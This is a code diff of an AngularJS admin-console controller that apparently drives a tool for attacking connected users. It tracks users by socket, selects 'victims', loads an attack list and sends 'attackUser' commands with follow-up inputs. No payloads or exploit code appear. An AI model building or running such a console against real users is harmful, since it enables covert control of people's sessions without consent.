@@ -2,20 +2,22 @@ angular.module('adminConsole.users', [])
 
 .controller('UserController', ['$scope', 'SocketFactory', function ($scope, SocketFactory) {
 
+  //contains all connected users
   $scope.users = [];
+
+  //contains user:socketId mapping
   $scope.selectedUsers = {};
+
+  //contains results from executed commands
   $scope.results = [];
 
   //request all users when controller loads
   SocketFactory.socket.emit('getUsers', {});
 
-  //request all attacks when controller loads
-  SocketFactory.socket.emit('getAttacks', {});
-
   SocketFactory.socket.on('newUser', function(user){
     $scope.$apply(function(){
       $scope.users.push(user);
-    })
+    });
   });
 
   SocketFactory.socket.on('userLeft', function(user){
@@ -29,22 +31,6 @@ angular.module('adminConsole.users', [])
     });
   });
 
-  SocketFactory.socket.on('attacks', function(attacks){
-    //all attacks are stored in ./attacks.js
-    $scope.$apply(function(){
-      $scope.attacks = attacks;
-    });
-  });
-
-  SocketFactory.socket.on('result', function(result){
-    $scope.$apply(function(){
-      $scope.results.push({
-        message: result.status +" on user " + result.id,
-        timestamp: new Date()
-      });
-    });
-  });
-
   $scope.selectUser = function(userId, userSocketId){
     if($scope.selectedUsers[userId]){
       $scope.selectedUsers[userId] = null;
@@ -53,20 +39,71 @@ angular.module('adminConsole.users', [])
     }
   };
 
-  $scope.executeAttack = function(attackName){
-    for(var user in $scope.selectedUsers){
+  //request all attacks when controller loads
+  SocketFactory.socket.emit('getAttacks', {});
 
-      var userSocket = $scope.selectedUsers[user];
+  SocketFactory.socket.on('attacks', function(attacks){
+    //all attacks are stored in ./attacks.js
+    $scope.$apply(function(){
+      $scope.attacks = attacks;
+    });
+  });
 
-      if(!!userSocket){ //verify user is selected
-        $scope.results.push({
-          message: "Executing attack " + attackName + " on user " + user,
-          timestamp: new Date()
-        });
-        SocketFactory.socket.emit('attackUser', { userSocket: userSocket, attack: attackName });
+  $scope.executeAttack = function(attackName, inputs, followup, victim){
+    var victimSockets = {};
+    var userSocket;
+    
+    if (victim !== undefined){//specific victim is specified in followup attacks
+      userSocket = $scope.selectedUsers[victim];
+      victimSockets[victim] = userSocket;
+    }else{
+      for(var user in $scope.selectedUsers){
+        userSocket = $scope.selectedUsers[user];
+
+        if(!!userSocket){ //verify user is selected
+          victimSockets[user] = userSocket;
+        }
       }
-
     }
+
+    for(var user in victimSockets){
+      $scope.results.push({
+        message: "Executing attack " + attackName + " on user " + user,
+        timestamp: new Date()
+      });
+      SocketFactory.socket.emit('attackUser', { 
+        userSocket: victimSockets[user], 
+        attack: attackName, 
+        followup: followup
+      });
+    }
+  };
+
+  SocketFactory.socket.on('result', function(result){
+
+    result.message = result.status + " on user " + result.id;
+    result.timestamp = new Date();
+    if(result.followup){
+      findAttackByName(result.name, function(ind){
+        //add inputs to result object
+        result.inputs = $scope.attacks[ind].followup.inputs;
+      });
+    }
+
+    $scope.$apply(function(){
+      $scope.results.push(result);
+    });
+  });
+
+  var findAttackByName = function(name, cb){
+    for(var i = 0; i < $scope.attacks.length; i++){
+      if($scope.attacks[i].name === name){
+        cb(i);
+        return;
+      }
+    }
+
+    cb(-1);
   };
 
 }]);
